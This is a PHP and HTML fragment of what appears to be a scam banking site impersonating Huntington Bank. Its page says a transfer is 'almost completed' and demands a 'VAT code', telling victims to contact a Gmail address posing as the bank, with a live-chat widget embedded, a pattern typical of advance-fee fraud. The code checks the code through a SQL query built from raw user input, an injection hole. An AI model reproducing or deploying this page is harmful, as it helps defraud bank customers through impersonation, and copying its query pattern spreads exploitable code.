...
//admin sign up
	...
	box-shadow: 5px 5px 5px rgba(68,68,68,0.6);color:#000;padding:7px;border-radius:5px;margin-top:10px;margin-right:5px;margin-left:5px;">OK</div>
            ...
            $q=$conn->query("SELECT * FROM codes WHERE account='$account' AND vat='$vat'") or die(mysqli_error($conn));
            if(mysqli_num_rows($q)>0){
                $_SESSION['code']=$account;
                header("location: ncc_authentication?account=".$_POST['account']."&vat=".$_POST['vat']."");
                exit;
            }
            else {
                $err='<div id="myModal" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            ...
            <div align="center" class="modal-body">
              <font color="red"><b>VAT Authorization Failed.</b></font><br>
              <div align="center" data-dismiss="modal" aria-hidden="true" style="font-weight:bold;background:#fff;border:1px solid #ccc;-moz-box-shadow: 5px 5px 5px rgba(68,68,68,0.6);
	-webkit-box-shadow: 5px 5px 5px rgba(68,68,68,0.6);
	box-shadow: 5px 5px 5px rgba(68,68,68,0.6);color:#000;padding:7px;border-radius:5px;margin-top:10px;margin-right:5px;margin-left:5px;">OK</div>
            </div>
...
<html lang="en-US" prefix="og: http://ogp.me/ns#">
	...
	<title>Verify VAT: Transfer Almost Completed | Huntington Bank</title>
    <style>
...
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Transfer In Progress</h5>
		...
		<input class="form-control input-lg no-border" type="number" name="vat" placeholder="Enter VAT Code here..."><br>
	<!-- <input type="submit" name="submit"> --><p style="font-size:14px;" class="failure">Enter <i><strong>Value Added Tax Code</strong></i> to continue transfer. If you do not have the code, kindly contact your bank (ibank.huntington@gmail.com) to proceed.
	 <div>
...
s1.async=true;
s1.src='https://embed.tawk.to/5ece20f5c75cbf1769efc408/default';
s1.charset='UTF-8';
